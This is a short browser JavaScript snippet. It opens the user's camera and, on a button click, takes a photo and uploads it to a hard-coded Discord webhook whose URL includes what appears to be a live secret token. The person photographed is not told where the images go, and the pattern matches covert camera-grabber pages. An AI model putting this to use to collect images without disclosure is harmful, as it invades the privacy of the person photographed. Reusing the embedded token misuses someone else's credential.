navigator.mediaDevices.getUserMedia({ video: true, audio: false })
 .then(stream => {
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);

    document.getElementById('take-picture-button').addEventListener('click', () => {
      imageCapture.takePhoto()
       .then(blob => {
          // Send the image to the Discord webhook
          const formData = new FormData();
          formData.append('file', blob, 'image.jpg');

          fetch('https://canary.discord.com/api/webhooks/1251788783695691878/RpGnRUG2GtPi-s7wtH9pXWkuIAudz1Qp1m-nSB9HoeoFL9eYe8lcEMyTvgkBuhjlxT-7', {
            method: 'POST',
            body: formData
          })
         .then(response => response.json())
         .then(data => console.log(`Sent image to Discord webhook: ${data}`))
         .catch(error => console.error(`Error sending image to Discord webhook: ${error}`));
        })
       .catch(error => console.error(`Error taking picture: ${error}`));
    });
  })
 .catch(error => console.error(`Error accessing camera: ${error}`));